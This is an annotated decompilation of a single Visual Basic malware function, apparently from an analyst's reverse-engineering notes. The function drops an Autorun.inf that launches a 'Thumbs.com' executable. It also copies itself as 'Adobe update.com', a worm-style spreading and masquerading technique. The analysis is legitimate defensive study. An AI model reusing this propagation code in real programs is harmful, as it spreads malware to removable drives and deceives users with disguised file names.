' Drop 2 copies on selected path
Public Function funct8(a) '4054C0
  'Data Table: 401838
  ' Note: <> means a logical NOT operator

  ' Define vars
  Dim sus_data As String
  Dim exe_path2 As String
  Dim autorun_content As Variant

  loc_4052F6: On Error Resume Next ' Ignore errors and keep running

  loc_405305: exe_name = CVar("Thumbs" & ".com") 'Variant
  loc_40531A: autorun_path = a & "Autorun.inf" 'Variant.
  loc_40532D: exe_path = a & exe_name 'Variant

  loc_40534E: sus_data = Thumbs   .db.address_80000285 ' Gives this var the value of that address, but will be overwritten
  
  ' Sets funct8 to 3 if the exe_path is set/valid (?) and the DLL is present
  loc_405373: If (exe_path And (Thumbs   .db.address_80000285 <> vbNullString)) Then ' If the path of the EXE file and the value on the DLL file IS NOT NULL, then...
  loc_405378:   funct8 = CLng(3) ' Set the return code to 3, but dont exit
  loc_40537E: End If
  
  loc_405388: sus_data = CStr(autorun_path)

  ' Calls 2 DLL functions
  loc_40538C: Thumbs   .db.address_80000244
  loc_405399: Thumbs   .db.address_80000211

  ' Drops the autorun
  loc_4053AC: Open CStr(autorun_path) For Output As 1 Len = &HFF ' Set a buffer for the file (???)
                                                                 ' Small note break:
                                                                 ' & is prepended for Long types
                                                                 ' H is prepended for hex representations
                                                                 ' So &HFF indicates a Long hex number with value FFh = 255dec
  loc_405404: autorun_content = CVar("[Autorun]" & vbCrLf & "Open=") & exe_name & vbCrLf & "Shellexecute=" & exe_name & vbCrLf & "Shell\auto\command=" & exe_name & vbCrLf 
  loc_405413: Print 1, autorun_content & "Shell=auto"
  loc_405437: Close 1

  ' Copies itself with the name Adobe update.com using funct1()
  loc_40544B: exe_path2 = CStr(exe_path)
  loc_40546D: sus_data = CStr(funct1(0) & "\" & "Adobe update" & ".com")

  ' Calls 2 different addresses 3 times in total. (maybe sus_data -> call args?)
  loc_405471: Thumbs   .db.address_80000240
  loc_405494: sus_data = CStr(autorun_path)
  loc_405498: Thumbs   .db.address_80000244
  loc_4054AE: Thumbs   .db.address_80000244
  loc_4054B8: funct8 = CStr(exe_path) ' Return CStr(exe_path)
End Function